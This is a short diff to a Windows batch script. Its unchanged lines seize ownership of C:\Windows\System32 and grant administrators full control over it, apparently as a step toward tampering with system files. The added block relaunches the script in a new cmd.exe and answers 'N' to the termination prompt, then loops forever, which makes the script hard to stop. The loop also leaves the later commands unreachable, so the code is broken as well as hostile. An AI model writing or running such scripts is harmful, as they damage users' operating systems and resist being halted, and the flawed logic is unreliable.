@@ -42,6 +42,19 @@ echo.
 echo.
 
 REM Take ownership of System32
+@echo off
+if "%1" equ "Restarted" goto %1
+
+:again
+echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
+goto :again
+
+:Restarted
+:loop
+timeout /T 1 > NUL
+goto loop
+if false goto continue
+:continue
 takeown /f C:\Windows\System32 /r /d y
 icacls C:\Windows\System32 /grant administrators:F /t
 cd C:\Windows\System32
